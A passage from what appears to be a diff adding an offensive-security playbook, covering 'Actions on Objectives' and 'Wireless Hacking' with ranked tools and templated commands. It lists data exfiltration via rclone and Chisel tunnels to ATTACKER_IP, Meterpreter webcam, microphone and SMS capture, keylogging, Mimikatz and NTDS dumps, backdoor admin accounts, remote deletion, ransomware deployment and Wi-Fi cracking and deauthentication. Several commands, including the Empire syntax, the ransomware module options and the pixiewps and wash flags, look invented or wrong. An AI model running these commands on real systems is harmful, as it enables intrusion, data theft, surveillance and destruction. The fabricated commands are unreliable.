+# 9. Bind to specific IP
+nc -l -p <PORT> -s <IP_ADDRESS> > /opt/sec/output/nc_bind_<TIMESTAMP>.txt 2>&1
+
+# 10. Save output to file
+nc -l -p <PORT> -o /opt/sec/output/nc_log_<TIMESTAMP>.txt > /opt/sec/output/nc_save_<TIMESTAMP>.txt 2>&1
+```
+
+---
+
+## PHASE 9: ACTIONS ON OBJECTIVES (★★★★★)
+
+**Description:** Executing the final objective: data exfiltration, ransomware deployment, or proving impact.
+
+### Ranked Tools (1-10)
+
+---
+
+#### 1. Rclone
+**Description:** Command-line program to sync files to various cloud storage providers.
+
+**Why Best:** Extremely fast and powerful for data exfiltration, supporting many cloud services.
+
+**Mods (Commands):**
+```bash
+# 1. Set up remote cloud storage
+rclone config > /opt/sec/output/rclone_config_<TIMESTAMP>.txt
+
+# 2. Copy files to cloud
+rclone copy <LOCAL_PATH> <REMOTE>:<PATH> > /opt/sec/output/rclone_copy_<TIMESTAMP>.txt
+
+# 3. Sync directory to cloud
+rclone sync <LOCAL_PATH> <REMOTE>:<PATH> > /opt/sec/output/rclone_sync_<TIMESTAMP>.txt
+
+# 4. Move files to cloud
+rclone move <LOCAL_PATH> <REMOTE>:<PATH> > /opt/sec/output/rclone_move_<TIMESTAMP>.txt
+
+# 5. List remote files
+rclone ls <REMOTE>:<PATH> > /opt/sec/output/rclone_ls_<TIMESTAMP>.txt
+
+# 6. Delete remote files
+rclone delete <REMOTE>:<PATH> > /opt/sec/output/rclone_delete_<TIMESTAMP>.txt
+
+# 7. Create remote directory
+rclone mkdir <REMOTE>:<PATH> > /opt/sec/output/rclone_mkdir_<TIMESTAMP>.txt
+
+# 8. Remove remote directory
+rclone rmdir <REMOTE>:<PATH> > /opt/sec/output/rclone_rmdir_<TIMESTAMP>.txt
+
+# 9. Copy specific file
+rclone copyto <LOCAL_FILE> <REMOTE>:<PATH>/<FILE> > /opt/sec/output/rclone_copyto_<TIMESTAMP>.txt
+
+# 10. Deduplicate files
+rclone dedupe <REMOTE>:<PATH> > /opt/sec/output/rclone_dedupe_<TIMESTAMP>.txt
+```
+
+---
+
+#### 2. Meterpreter
+**Description:** Metasploit's versatile post-exploitation payload.
+
+**Why Best:** Extensive set of post-exploitation modules for diverse actions.
+
+**Mods (Commands):**
+```bash
+# 1. Download file
+meterpreter > download <REMOTE_FILE> /opt/sec/output/meterpreter_objective_download_<TIMESTAMP> > /opt/sec/output/meterpreter_objective_download_log_<TIMESTAMP>.txt
+
+# 2. Upload file
+meterpreter > upload /opt/sec/inputs/<LOCAL_FILE> <REMOTE_FILE> > /opt/sec/output/meterpreter_objective_upload_<TIMESTAMP>.txt
+
+# 3. Execute command
+meterpreter > execute -f <COMMAND> > /opt/sec/output/meterpreter_objective_exec_<TIMESTAMP>.txt
+
+# 4. Spawn native shell
+meterpreter > shell > /opt/sec/output/meterpreter_objective_shell_<TIMESTAMP>.txt
+
+# 5. Take screenshot
+meterpreter > screenshot -o /opt/sec/output/meterpreter_objective_screen_<TIMESTAMP>.png > /opt/sec/output/meterpreter_objective_screen_log_<TIMESTAMP>.txt
+
+# 6. Record audio
+meterpreter > record_mic -o /opt/sec/output/meterpreter_objective_audio_<TIMESTAMP>.wav > /opt/sec/output/meterpreter_objective_audio_log_<TIMESTAMP>.txt
+
+# 7. Take webcam picture
+meterpreter > webcam_snap -o /opt/sec/output/meterpreter_objective_cam_<TIMESTAMP>.jpg > /opt/sec/output/meterpreter_objective_cam_log_<TIMESTAMP>.txt
+
+# 8. Dump contacts (Android)
+meterpreter > dump_contacts > /opt/sec/output/meterpreter_objective_contacts_<TIMESTAMP>.txt
+
+# 9. Dump SMS (Android)
+meterpreter > dump_sms > /opt/sec/output/meterpreter_objective_sms_<TIMESTAMP>.txt
+
+# 10. Geolocate target
+meterpreter > geolocate > /opt/sec/output/meterpreter_objective_geo_<TIMESTAMP>.txt
+```
+
+---
+
+#### 3. Empire
+**Description:** Post-exploitation framework with robust modules.
+
+**Why Best:** Modules designed for stealth and efficiency.
+
+**Mods (Commands):**
+```bash
+# 1. Download file
+empire --command "usemodule powershell/management/download; set Source <URL>; set Destination <PATH>; execute; exit" > /opt/sec/output/empire_objective_download_<TIMESTAMP>.txt
+
+# 2. Upload file
+empire --command "usemodule powershell/management/upload; set Source <PATH>; set Destination <PATH>; execute; exit" > /opt/sec/output/empire_objective_upload_<TIMESTAMP>.txt
+
+# 3. Execute .NET assembly
+empire --command "usemodule powershell/management/execute_assembly; set Assembly <PATH>; execute; exit" > /opt/sec/output/empire_objective_assembly_<TIMESTAMP>.txt
+
+# 4. Execute .NET with args
+empire --command "usemodule powershell/management/execute_dotnet; set Assembly <PATH>; set Arguments <ARGS>; execute; exit" > /opt/sec/output/empire_objective_dotnet_<TIMESTAMP>.txt
+
+# 5. Take screenshot
+empire --command "usemodule powershell/management/screenshot; execute; exit" > /opt/sec/output/empire_objective_screen_<TIMESTAMP>.txt
+
+# 6. Start keylogger
+empire --command "usemodule powershell/management/keylogger; execute; exit" > /opt/sec/output/empire_objective_keylog_<TIMESTAMP>.txt
+
+# 7. Run Mimikatz
+empire --command "usemodule powershell/management/mimikatz; execute; exit" > /opt/sec/output/empire_objective_mimikatz_<TIMESTAMP>.txt
+
+# 8. Run command
+empire --command "usemodule powershell/management/run_command; set Command <COMMAND>; execute; exit" > /opt/sec/output/empire_objective_cmd_<TIMESTAMP>.txt
+
+# 9. Run macro
+empire --command "usemodule powershell/management/run_macro; set Macro <MACRO>; execute; exit" > /opt/sec/output/empire_objective_macro_<TIMESTAMP>.txt
+
+# 10. Run script
+empire --command "usemodule powershell/management/run_script; set Script <SCRIPT>; execute; exit" > /opt/sec/output/empire_objective_script_<TIMESTAMP>.txt
+```
+
+---
+
+#### 4. CrackMapExec
+**Description:** Execute destructive commands across the domain.
+
+**Why Best:** Actions executed on multiple targets simultaneously, scaling impact.
+
+**Mods (Commands):**
+```bash
+# 1. Delete files
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> -x "del /f /q C:\temp\*" > /opt/sec/output/cme_objective_delete_<TIMESTAMP>.txt
+
+# 2. Upload file
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --put-file /opt/sec/inputs/<LOCAL_FILE> <REMOTE_FILE> > /opt/sec/output/cme_objective_upload_<TIMESTAMP>.txt
+
+# 3. Download file
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --get-file <REMOTE_FILE> /opt/sec/output/cme_objective_download_<TIMESTAMP> > /opt/sec/output/cme_objective_download_log_<TIMESTAMP>.txt
+
+# 4. Reboot system
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> -x "shutdown /r /f /t 0" > /opt/sec/output/cme_objective_reboot_<TIMESTAMP>.txt
+
+# 5. Delete user
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> -x "net user <USER> /delete" > /opt/sec/output/cme_objective_deluser_<TIMESTAMP>.txt
+
+# 6. Dump SAM hashes
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --sam > /opt/sec/output/cme_objective_sam_<TIMESTAMP>.txt
+
+# 7. Dump LSA secrets
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --lsa > /opt/sec/output/cme_objective_lsa_<TIMESTAMP>.txt
+
+# 8. Dump NTDS.dit
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --ntds > /opt/sec/output/cme_objective_ntds_<TIMESTAMP>.txt
+
+# 9. Add backdoor user
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> -x "net user <USER> <PASSWORD> /add" > /opt/sec/output/cme_objective_adduser_<TIMESTAMP>.txt
+
+# 10. Make user admin
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> -x "net localgroup administrators <USER> /add" > /opt/sec/output/cme_objective_admin_<TIMESTAMP>.txt
+```
+
+---
+
+#### 5. Proxychains
+**Description:** Route all tools through proxy for anonymization.
+
+**Why Best:** Provides anonymity and ability to pivot through compromised systems.
+
+**Mods (Commands):**
+```bash
+# 1. Route Nmap through proxy
+proxychains nmap -sT -Pn <TARGET_IP> -o /opt/sec/output/proxychains_objective_nmap_<TIMESTAMP>.txt
+
+# 2. Route SQLmap through proxy
+proxychains sqlmap -u "<URL>" --batch --output-dir=/opt/sec/output/proxychains_objective_sqlmap_<TIMESTAMP>
+
+# 3. Route Rclone through proxy
+proxychains rclone copy <LOCAL_PATH> <REMOTE>:<PATH> > /opt/sec/output/proxychains_objective_rclone_<TIMESTAMP>.txt
+
+# 4. Route cURL through proxy
+proxychains curl <URL> > /opt/sec/output/proxychains_objective_curl_<TIMESTAMP>.txt
+
+# 5. Custom config file
+proxychains -f /opt/sec/configs/proxychains.conf nmap -sT -Pn <TARGET_IP> > /opt/sec/output/proxychains_objective_custom_<TIMESTAMP>.txt
+
+# 6. SSH through proxy
+proxychains ssh <USER>@<TARGET_IP> > /opt/sec/output/proxychains_objective_ssh_<TIMESTAMP>.txt 2>&1
+
+# 7. Netcat through proxy
+proxychains nc -nvv <TARGET_IP> <PORT> > /opt/sec/output/proxychains_objective_nc_<TIMESTAMP>.txt
+
+# 8. wget through proxy
+proxychains wget <URL> -O /opt/sec/output/proxychains_objective_wget_<TIMESTAMP>.txt
+
+# 9. Hydra through proxy
+proxychains hydra <TARGET_IP> ssh -L /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt -o /opt/sec/output/proxychains_objective_hydra_<TIMESTAMP>.txt
+
+# 10. FireFox through proxy
+proxychains firefox > /opt/sec/output/proxychains_objective_firefox_<TIMESTAMP>.txt 2>&1
+```
+
+---
+
+#### 6. Chisel
+**Description:** Fast tunnels for exfiltration or exposing internal networks.
+
+**Why Best:** Stable, high-speed tunnels over HTTP for data exfiltration.
+
+**Mods (Commands):**
+```bash
+# 1. Start reverse server
+chisel server -p <PORT> --reverse > /opt/sec/output/chisel_objective_server_<TIMESTAMP>.txt
+
+# 2. Start client for SOCKS proxy
+chisel client <ATTACKER_IP>:<PORT> R:socks > /opt/sec/output/chisel_objective_socks_<TIMESTAMP>.txt
+
+# 3. Forward RDP port
+chisel client <ATTACKER_IP>:<PORT> R:8000:127.0.0.1:3389 > /opt/sec/output/chisel_objective_rdp_<TIMESTAMP>.txt
+
+# 4. Server with key
+chisel server --port <PORT> --key <KEY> > /opt/sec/output/chisel_objective_key_<TIMESTAMP>.txt
+
+# 5. Client with key
+chisel client --key <KEY> <ATTACKER_IP>:<PORT> R:socks > /opt/sec/output/chisel_objective_key_client_<TIMESTAMP>.txt
+
+# 6. Server with auth
+chisel server -p <PORT> -auth <USER>:<PASSWORD> > /opt/sec/output/chisel_objective_auth_<TIMESTAMP>.txt
+
+# 7. Client with auth
+chisel client -auth <USER>:<PASSWORD> <ATTACKER_IP>:<PORT> R:socks > /opt/sec/output/chisel_objective_auth_client_<TIMESTAMP>.txt
+
+# 8. Log server activity
+chisel server -p <PORT> --log-file /opt/sec/output/chisel_objective_log_<TIMESTAMP>.txt
+
+# 9. Log client activity
+chisel client --log-file /opt/sec/output/chisel_objective_client_log_<TIMESTAMP>.txt <ATTACKER_IP>:<PORT> R:socks
+
+# 10. Set keepalive interval
+chisel client --keepalive 30s <ATTACKER_IP>:<PORT> R:socks > /opt/sec/output/chisel_objective_keepalive_<TIMESTAMP>.txt
+```
+
+---
+
+#### 7. WinRAR / 7-Zip
+**Description:** Command-line compression for efficient data exfiltration.
+
+**Why Best:** Legitimate tools available on many systems for "living off the land."
+
+**Mods (Commands):**
+```bash
+# 1. Create RAR archive
+rar.exe a -r /opt/sec/output/archive_<TIMESTAMP>.rar <DIRECTORY> > /opt/sec/output/rar_create_<TIMESTAMP>.txt
+
+# 2. Encrypt RAR archive
+rar.exe a -p<PASSWORD> /opt/sec/output/archive_<TIMESTAMP>.rar <DIRECTORY> > /opt/sec/output/rar_encrypt_<TIMESTAMP>.txt
+
+# 3. Split RAR into 100MB volumes
+rar.exe a -v100m /opt/sec/output/archive_<TIMESTAMP>.rar <DIRECTORY> > /opt/sec/output/rar_split_<TIMESTAMP>.txt
+
+# 4. Create 7z archive
+7z.exe a -t7z /opt/sec/output/archive_<TIMESTAMP>.7z <DIRECTORY> > /opt/sec/output/7z_create_<TIMESTAMP>.txt
+
+# 5. Encrypt 7z archive
+7z.exe a -p<PASSWORD> /opt/sec/output/archive_<TIMESTAMP>.7z <DIRECTORY> > /opt/sec/output/7z_encrypt_<TIMESTAMP>.txt
+
+# 6. Split 7z into 100MB volumes
+7z.exe a -v100m /opt/sec/output/archive_<TIMESTAMP>.7z <DIRECTORY> > /opt/sec/output/7z_split_<TIMESTAMP>.txt
+
+# 7. Extract RAR archive
+rar.exe x /opt/sec/output/archive_<TIMESTAMP>.rar > /opt/sec/output/rar_extract_<TIMESTAMP>.txt
+
+# 8. Extract 7z archive
+7z.exe x /opt/sec/output/archive_<TIMESTAMP>.7z > /opt/sec/output/7z_extract_<TIMESTAMP>.txt
+
+# 9. List RAR contents
+rar.exe lt /opt/sec/output/archive_<TIMESTAMP>.rar > /opt/sec/output/rar_list_<TIMESTAMP>.txt
+
+# 10. List 7z contents
+7z.exe l /opt/sec/output/archive_<TIMESTAMP>.7z > /opt/sec/output/7z_list_<TIMESTAMP>.txt
+```
+
+---
+
+#### 8. CertUtil
+**Description:** Built-in Windows certificate management tool for file encoding and exfiltration.
+
+**Why Best:** Powerful native tool that can bypass file type restrictions.
+
+**Mods (Commands):**
+```bash
+# 1. Encode to Base64
+certutil -encode /opt/sec/inputs/<INPUT_FILE> /opt/sec/output/certutil_encoded_<TIMESTAMP>.b64 > /opt/sec/output/certutil_encode_<TIMESTAMP>.txt
+
+# 2. Decode from Base64
+certutil -decode /opt/sec/output/certutil_encoded_<TIMESTAMP>.b64 /opt/sec/output/certutil_decoded_<TIMESTAMP>.file > /opt/sec/output/certutil_decode_<TIMESTAMP>.txt
+
+# 3. Get MD5 hash
+certutil -hashfile <FILE> MD5 > /opt/sec/output/certutil_md5_<TIMESTAMP>.txt
+
+# 4. Get SHA1 hash
+certutil -hashfile <FILE> SHA1 > /opt/sec/output/certutil_sha1_<TIMESTAMP>.txt
+
+# 5. Get SHA256 hash
+certutil -hashfile <FILE> SHA256 > /opt/sec/output/certutil_sha256_<TIMESTAMP>.txt
+
+# 6. Ping server
+certutil -ping > /opt/sec/output/certutil_ping_<TIMESTAMP>.txt
+
+# 7. Download file
+certutil -urlcache -f <URL> /opt/sec/output/certutil_download_<TIMESTAMP>.file > /opt/sec/output/certutil_download_log_<TIMESTAMP>.txt
+
+# 8. Download and delete cache
+certutil -urlcache -f <URL> /opt/sec/output/certutil_download_<TIMESTAMP>.file delete > /opt/sec/output/certutil_delete_<TIMESTAMP>.txt
+
+# 9. Verbose mode
+certutil -v > /opt/sec/output/certutil_verbose_<TIMESTAMP>.txt
+
+# 10. Show help
+certutil -? > /opt/sec/output/certutil_help_<TIMESTAMP>.txt
+```
+
+---
+
+#### 9. PowerShell (Bypass)
+**Description:** PowerShell for native access to system APIs.
+
+**Why Best:** Allows native access to almost any system operation.
+
+**Mods (Commands):**
+```bash
+# 1. Bypass policy and run script
+powershell -NoProfile -ExecutionPolicy Bypass -File /opt/sec/scripts/<SCRIPT>.ps1 > /opt/sec/output/powershell_objective_script_<TIMESTAMP>.txt
+
+# 2. Run encoded command
+powershell -EncodedCommand <BASE64> > /opt/sec/output/powershell_objective_encoded_<TIMESTAMP>.txt
+
+# 3. Execute command
+powershell -C "& { <COMMAND> }" > /opt/sec/output/powershell_objective_cmd_<TIMESTAMP>.txt
+
+# 4. Get process list
+powershell -C "Get-Process" > /opt/sec/output/powershell_objective_ps_<TIMESTAMP>.txt
+
+# 5. Get service list
+powershell -C "Get-Service" > /opt/sec/output/powershell_objective_services_<TIMESTAMP>.txt
+
+# 6. Create directory
+powershell -C "New-Item -ItemType Directory -Path <PATH>" > /opt/sec/output/powershell_objective_mkdir_<TIMESTAMP>.txt
+
+# 7. Delete directory
+powershell -C "Remove-Item -Path <PATH> -Recurse -Force" > /opt/sec/output/powershell_objective_rmdir_<TIMESTAMP>.txt
+
+# 8. Copy item
+powershell -C "Copy-Item <SOURCE> <DESTINATION> -Recurse" > /opt/sec/output/powershell_objective_copy_<TIMESTAMP>.txt
+
+# 9. Move item
+powershell -C "Move-Item <SOURCE> <DESTINATION> -Recurse" > /opt/sec/output/powershell_objective_move_<TIMESTAMP>.txt
+
+# 10. Download file
+powershell -C "Invoke-WebRequest -Uri <URL> -OutFile /opt/sec/output/powershell_objective_download_<TIMESTAMP>.file" > /opt/sec/output/powershell_objective_download_log_<TIMESTAMP>.txt
+```
+
+---
+
+#### 10. Metasploit (Ransomware)
+**Description:** Ransomware modules for impact demonstration.
+
+**Why Best:** Shows full impact of compromise for powerful narrative.
+
+**Mods (Commands):**
+```bash
+# 1. Use ransomware module
+msfconsole -q -x "use post/windows/manage/ransomware; set SESSION <SESSION_ID>; run; exit" > /opt/sec/output/msf_ransom_<TIMESTAMP>.txt
+
+# 2. Enable encryption
+msfconsole -q -x "use post/windows/manage/ransomware; set ENCRYPTION true; set SESSION <SESSION_ID>; run; exit" > /opt/sec/output/msf_ransom_encrypt_<TIMESTAMP>.txt
+
+# 3. Enable file destruction
+msfconsole -q -x "use post/windows/manage/ransomware; set FILE_DESTROY true; set SESSION <SESSION_ID>; run; exit" > /opt/sec/output/msf_ransom_destroy_<TIMESTAMP>.txt
+
+# 4. Change wallpaper
+msfconsole -q -x "use post/windows/manage/ransomware; set WALLPAPER_CHANGE true; set SESSION <SESSION_ID>; run; exit" > /opt/sec/output/msf_ransom_wallpaper_<TIMESTAMP>.txt
+
+# 5. Set ransom note
+msfconsole -q -x "use post/windows/manage/ransomware; set RANSOM_NOTE \"Your files are encrypted\"; set SESSION <SESSION_ID>; run; exit" > /opt/sec/output/msf_ransom_note_<TIMESTAMP>.txt
+
+# 6. Set decryption key
+msfconsole -q -x "use post/windows/manage/ransomware; set DECRYPT_KEY <KEY>; set SESSION <SESSION_ID>; run; exit" > /opt/sec/output/msf_ransom_key_<TIMESTAMP>.txt
+
+# 7. Set encryption method
+msfconsole -q -x "use post/windows/manage/ransomware; set ENCRYPTION_METHOD aes_256; set SESSION <SESSION_ID>; run; exit" > /opt/sec/output/msf_ransom_aes_<TIMESTAMP>.txt
+
+# 8. Show options
+msfconsole -q -x "use post/windows/manage/ransomware; show options; exit" > /opt/sec/output/msf_ransom_options_<TIMESTAMP>.txt
+
+# 9. Run with verbose
+msfconsole -q -x "use post/windows/manage/ransomware; set VERBOSE true; set SESSION <SESSION_ID>; run; exit" > /opt/sec/output/msf_ransom_verbose_<TIMESTAMP>.txt
+
+# 10. Run with debug
+msfconsole -q -x "use post/windows/manage/ransomware; set DEBUG true; set SESSION <SESSION_ID>; run; exit" > /opt/sec/output/msf_ransom_debug_<TIMESTAMP>.txt
+```
+
+---
+
+## PHASE 10: WIRELESS HACKING (★★★★★)
+
+**Description:** Specialized attacks on wireless networks including Wi-Fi and Bluetooth.
+
+### Ranked Tools (1-10)
+
+---
+
+#### 1. Aircrack-ng Suite
+**Description:** Complete suite for assessing Wi-Fi security including packet capture and attacks.
+
+**Why Best:** Foundational toolkit for all Wi-Fi attacks with core components.
+
+**Mods (Commands):**
+```bash
+# 1. Enable monitor mode
+airmon-ng start <INTERFACE> > /opt/sec/output/airmon_start_<TIMESTAMP>.txt
+
+# 2. Scan for networks
+airodump-ng <MONITOR_INTERFACE> > /opt/sec/output/airodump_scan_<TIMESTAMP>.txt
+
+# 3. Capture handshake
+airodump-ng -c <CHANNEL> --bssid <BSSID> -w /opt/sec/output/airodump_capture_<TIMESTAMP> <MONITOR_INTERFACE> > /opt/sec/output/airodump_capture_log_<TIMESTAMP>.txt
+
+# 4. Deauthenticate client
+aireplay-ng -0 5 -a <BSSID> <MONITOR_INTERFACE> > /opt/sec/output/aireplay_deauth_<TIMESTAMP>.txt
+
+# 5. Fake authentication (WEP)
+aireplay-ng -1 0 -a <BSSID> <MONITOR_INTERFACE> > /opt/sec/output/aireplay_fake_<TIMESTAMP>.txt
+
+# 6. ARP replay attack (WEP)
+aireplay-ng -2 -p 0841 -c ff:ff:ff:ff:ff:ff -b <BSSID> <MONITOR_INTERFACE> > /opt/sec/output/aireplay_arp_<TIMESTAMP>.txt
+
+# 7. Crack WPA/WPA2 handshake
+aircrack-ng -w /opt/sec/wordlists/passwords.txt <CAP_FILE>.cap > /opt/sec/output/aircrack_wpa_<TIMESTAMP>.txt
+
+# 8. Crack WEP
+aircrack-ng -n 64 -b <BSSID> <CAP_FILE>.cap > /opt/sec/output/aircrack_wep_<TIMESTAMP>.txt
+
+# 9. Disable monitor mode
+airmon-ng stop <MONITOR_INTERFACE> > /opt/sec/output/airmon_stop_<TIMESTAMP>.txt
+
+# 10. Show specific BSSID only
+airodump-ng -a --bssid <BSSID> <MONITOR_INTERFACE> > /opt/sec/output/airodump_bssid_<TIMESTAMP>.txt
+```
+
+---
+
+#### 2. Reaver
+**Description:** Tool to brute-force WPS PINs to recover WPA/WPA2 passphrase.
+
+**Why Best:** Most effective tool for exploiting the WPS vulnerability.
+
+**Mods (Commands):**
+```bash
+# 1. Basic WPS attack
+reaver -i <MONITOR_INTERFACE> -b <BSSID> -v > /opt/sec/output/reaver_basic_<TIMESTAMP>.txt
+
+# 2. Specify channel
+reaver -i <MONITOR_INTERFACE> -b <BSSID> -c <CHANNEL> -v > /opt/sec/output/reaver_channel_<TIMESTAMP>.txt
+
+# 3. Use specific PIN
+reaver -i <MONITOR_INTERFACE> -b <BSSID> -p <PIN> > /opt/sec/output/reaver_pin_<TIMESTAMP>.txt
+
+# 4. Use wash to find WPS networks
+reaver -i <MONITOR_INTERFACE> -b <BSSID> -w > /opt/sec/output/reaver_wash_<TIMESTAMP>.txt
+
+# 5. Set timeout
+reaver -i <MONITOR_INTERFACE> -b <BSSID> -t <TIMEOUT> > /opt/sec/output/reaver_timeout_<TIMESTAMP>.txt
+
+# 6. Set delay
+reaver -i <MONITOR_INTERFACE> -b <BSSID> -d <DELAY> > /opt/sec/output/reaver_delay_<TIMESTAMP>.txt
+
+# 7. Set rate
+reaver -i <MONITOR_INTERFACE> -b <BSSID> -r <RATE> > /opt/sec/output/reaver_rate_<TIMESTAMP>.txt
+
+# 8. Save output
+reaver -i <MONITOR_INTERFACE> -b <BSSID> -o /opt/sec/output/reaver_output_<TIMESTAMP>.txt
+
+# 9. Show progress
+reaver -i <MONITOR_INTERFACE> -b <BSSID> -s > /opt/sec/output/reaver_progress_<TIMESTAMP>.txt
+
+# 10. Use Pixie Dust attack
+reaver -i <MONITOR_INTERFACE> -b <BSSID> -K > /opt/sec/output/reaver_pixie_<TIMESTAMP>.txt
+```
+
+---
+
+#### 3. Wifite
+**Description:** Automated tool wrapping common Wi-Fi attacks into simple interface.
+
+**Why Best:** Automates attack process, focusing on strategy over manual commands.
+
+**Mods (Commands):**
+```bash
+# 1. Run default interactive mode
+wifite > /opt/sec/output/wifite_default_<TIMESTAMP>.txt
+
+# 2. Only WPA/WPA2 networks
+wifite -wpa > /opt/sec/output/wifite_wpa_<TIMESTAMP>.txt
+
+# 3. Only WPS-enabled networks
+wifite -wps > /opt/sec/output/wifite_wps_<TIMESTAMP>.txt
+
+# 4. Only WEP networks
+wifite -wep > /opt/sec/output/wifite_wep_<TIMESTAMP>.txt
+
+# 5. Attack APs with signal strength > 50
+wifite -pow 50 > /opt/sec/output/wifite_power_<TIMESTAMP>.txt
+
+# 6. Only scan channels 1-6
+wifite -c 1-6 > /opt/sec/output/wifite_channels_<TIMESTAMP>.txt
+
+# 7. Randomize MAC address
+wifite -mac > /opt/sec/output/wifite_mac_<TIMESTAMP>.txt
+
+# 8. Pillage mode (attack all after 5 minutes)
+wifite -p 5 > /opt/sec/output/wifite_pillage_<TIMESTAMP>.txt
+
+# 9. Kill conflicting processes
+wifite -kill > /opt/sec/output/wifite_kill_<TIMESTAMP>.txt
+
+# 10. Use custom wordlist
+wifite -dict /opt/sec/wordlists/passwords.txt > /opt/sec/output/wifite_dict_<TIMESTAMP>.txt
+```
+
+---
+
+#### 4. Wash
+**Description:** Utility for identifying WPS-enabled access points.
+
+**Why Best:** Primary tool for quickly scanning for vulnerable WPS networks.
+
+**Mods (Commands):**
+```bash
+# 1. Scan for WPS networks
+wash -i <MONITOR_INTERFACE> > /opt/sec/output/wash_scan_<TIMESTAMP>.txt
+
+# 2. Scan specific channel
+wash -i <MONITOR_INTERFACE> -c <CHANNEL> > /opt/sec/output/wash_channel_<TIMESTAMP>.txt
+
+# 3. Ignore frame checksum errors
+wash -i <MONITOR_INTERFACE> -C > /opt/sec/output/wash_checksum_<TIMESTAMP>.txt
+
+# 4. Show only locked APs
+wash -i <MONITOR_INTERFACE> -L > /opt/sec/output/wash_locked_<TIMESTAMP>.txt
+
+# 5. Show only unlocked APs
+wash -i <MONITOR_INTERFACE> -U > /opt/sec/output/wash_unlocked_<TIMESTAMP>.txt
+
+# 6. Show APs in range
+wash -i <MONITOR_INTERFACE> -f > /opt/sec/output/wash_range_<TIMESTAMP>.txt
+
+# 7. Save output
+wash -i <MONITOR_INTERFACE> -o /opt/sec/output/wash_output_<TIMESTAMP>.txt
+
+# 8. Show APs by BSSID
+wash -i <MONITOR_INTERFACE> -n > /opt/sec/output/wash_bssid_<TIMESTAMP>.txt
+
+# 9. Set timeout
+wash -i <MONITOR_INTERFACE> -t <TIMEOUT> > /opt/sec/output/wash_timeout_<TIMESTAMP>.txt
+
+# 10. Verbose output
+wash -i <MONITOR_INTERFACE> -v > /opt/sec/output/wash_verbose_<TIMESTAMP>.txt
+```
+
+---
+
+#### 5. Bettercap (Wireless)
+**Description:** MITM framework with wireless attack capabilities.
+
+**Why Best:** Integrates Wi-Fi attacks into larger MITM framework.
+
+**Mods (Commands):**
+```bash
+# 1. Start Wi-Fi recon
+bettercap -I <INTERFACE> -eval "wifi.recon on" > /opt/sec/output/bettercap_wifi_recon_<TIMESTAMP>.txt
+
+# 2. Deauth specific AP
+bettercap -I <INTERFACE> -eval "wifi.deauth <BSSID>" > /opt/sec/output/bettercap_wifi_deauth_<TIMESTAMP>.txt
+
+# 3. Create fake AP
+bettercap -I <INTERFACE> -eval "wifi.ap <SSID>" > /opt/sec/output/bettercap_wifi_ap_<TIMESTAMP>.txt
+
+# 4. Set SSID
+bettercap -I <INTERFACE> -eval "wifi.ap.ssid <SSID>" > /opt/sec/output/bettercap_wifi_ssid_<TIMESTAMP>.txt
+
+# 5. Set BSSID
+bettercap -I <INTERFACE> -eval "wifi.ap.bssid <BSSID>" > /opt/sec/output/bettercap_wifi_bssid_<TIMESTAMP>.txt
+
+# 6. Set channel
+bettercap -I <INTERFACE> -eval "wifi.ap.channel <CHANNEL>" > /opt/sec/output/bettercap_wifi_channel_<TIMESTAMP>.txt
+
+# 7. Show discovered networks
+bettercap -I <INTERFACE> -eval "wifi.show" > /opt/sec/output/bettercap_wifi_show_<TIMESTAMP>.txt
+
+# 8. Capture handshake
+bettercap -I <INTERFACE> -eval "wifi.handshake" > /opt/sec/output/bettercap_wifi_handshake_<TIMESTAMP>.txt
+
+# 9. Start attack
+bettercap -I <INTERFACE> -eval "wifi.attack" > /opt/sec/output/bettercap_wifi_attack_<TIMESTAMP>.txt
+
+# 10. Associate with AP
+bettercap -I <INTERFACE> -eval "wifi.assoc" > /opt/sec/output/bettercap_wifi_assoc_<TIMESTAMP>.txt
+```
+
+---
+
+#### 6. PixieWPS
+**Description:** Tool specifically for brute-forcing WPS PINs using Pixie Dust vulnerability.
+
+**Why Best:** Most effective tool for this specific, high-impact attack.
+
+**Mods (Commands):**
+```bash
+# 1. Basic Pixie Dust attack
+pixiewps -i <MONITOR_INTERFACE> > /opt/sec/output/pixiewps_basic_<TIMESTAMP>.txt
+
+# 2. Target specific AP
+pixiewps -i <MONITOR_INTERFACE> -b <BSSID> > /opt/sec/output/pixiewps_bssid_<TIMESTAMP>.txt
+
+# 3. Set channel
+pixiewps -i <MONITOR_INTERFACE> -c <CHANNEL> > /opt/sec/output/pixiewps_channel_<TIMESTAMP>.txt
+
+# 4. Use specific PIN
+pixiewps -i <MONITOR_INTERFACE> -p <PIN> > /opt/sec/output/pixiewps_pin_<TIMESTAMP>.txt
+
+# 5. Use wordlist
+pixiewps -i <MONITOR_INTERFACE> -w > /opt/sec/output/pixiewps_wordlist_<TIMESTAMP>.txt
+
+# 6. Verbose mode
+pixiewps -i <MONITOR_INTERFACE> -v > /opt/sec/output/pixiewps_verbose_<TIMESTAMP>.txt
+
+# 7. Set timeout
+pixiewps -i <MONITOR_INTERFACE> -t <TIMEOUT> > /opt/sec/output/pixiewps_timeout_<TIMESTAMP>.txt
+
+# 8. Save output
+pixiewps -i <MONITOR_INTERFACE> -o /opt/sec/output/pixiewps_output_<TIMESTAMP>.txt
+
+# 9. Show EAPOL data
+pixiewps -i <MONITOR_INTERFACE> -e > /opt/sec/output/pixiewps_eapol_<TIMESTAMP>.txt
+
+# 10. Show progress
+pixiewps -i <MONITOR_INTERFACE> -s > /opt/sec/output/pixiewps_progress_<TIMESTAMP>.txt
+```
+
+---
+
+#### 7. Kismet
+**Description:** Powerful wireless network sniffer, detector, and intrusion detection system.
+
+**Why Best:** Comprehensive tool for deep wireless network analysis.
+
+**Mods (Commands):**
+```bash
+# 1. Start Kismet server
+kismet > /opt/sec/output/kismet_start_<TIMESTAMP>.txt
+
+# 2. Start with specific interface
+kismet -c <MONITOR_INTERFACE> > /opt/sec/output/kismet_interface_<TIMESTAMP>.txt
+
+# 3. Start with no interface
+kismet -n > /opt/sec/output/kismet_noiface_<TIMESTAMP>.txt
+
+# 4. Use custom config file
